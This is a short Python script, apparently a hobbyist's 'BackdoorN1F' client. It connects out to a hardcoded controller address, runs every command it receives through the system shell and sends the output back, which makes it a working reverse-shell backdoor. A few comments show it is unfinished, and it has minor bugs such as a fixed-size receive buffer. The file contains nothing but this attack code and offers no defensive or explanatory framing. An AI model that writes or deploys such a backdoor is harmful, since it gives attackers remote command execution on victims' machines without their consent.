#!/usr/bin/python3

#########################################################################################
#   Client ... or something like that   
#########################################################################################

import socket
import subprocess
import json

S_IP = "192.168.0.13"
S_PORT = 9091

class BackdoorN1F:
    def __init__(self, ip, port):
        self.connectto = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connectto.connect((ip, port))


#   #####################################################################################
#   Need to make it work ...
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connectto.sendall(bytes(json_data, encoding="utf-8"))

    def reliable_recv(self):
        json_data = self.connectto.recv(4096)
        return json.loads(json_data)

#   #####################################################################################

    def execute_sys_command(self,command):
        return subprocess.check_output(command, shell=True)

    def run_backdoor(self):
        while True:
            command = self.reliable_recv()
            command_result = self.execute_sys_command(command)
            self.reliable_send(command_result.decode("utf-8"))
        connectto.close()

if __name__ == "__main__":
    b = BackdoorN1F(S_IP, S_PORT)
    b.run_backdoor()

